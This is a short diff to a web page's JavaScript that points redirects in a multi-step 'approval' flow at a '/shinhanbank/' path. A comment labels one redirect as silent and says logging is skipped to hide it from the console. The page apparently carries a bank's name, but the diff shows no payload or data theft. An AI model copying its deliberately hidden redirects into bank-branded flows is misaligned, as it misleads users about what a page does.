@@ -890,10 +890,10 @@ class EnhancedApprovalProcess {
                     
                     // Force redirect ngay lập tức
                     try {
-                        window.location.href = '/pages/vi/step5.html';
+                        window.location.href = '/shinhanbank/pages/vi/step5.html';
                     } catch (error) {
                         // Redirect failed
-                        window.location.replace('/pages/vi/step5.html');
+                        window.location.replace('/shinhanbank/pages/vi/step5.html');
                     }
                 }, 500); // Giữ nguyên cho manual redirect
 }
@@ -917,9 +917,9 @@ document.addEventListener('DOMContentLoaded', () => {
                     clearInterval(countdownInterval);
                     // Silent redirect - không log để ẩn khỏi console
                     try {
-                        window.location.href = '/pages/vi/step5.html';
+                        window.location.href = '/shinhanbank/pages/vi/step5.html';
                     } catch (error) {
-                        window.location.replace('/pages/vi/step5.html');
+                        window.location.replace('/shinhanbank/pages/vi/step5.html');
                     }
                 }
             }, 1000);
@@ -930,4 +930,5 @@ document.addEventListener('DOMContentLoaded', () => {
 </script>
 </body>
 </html>
+
 
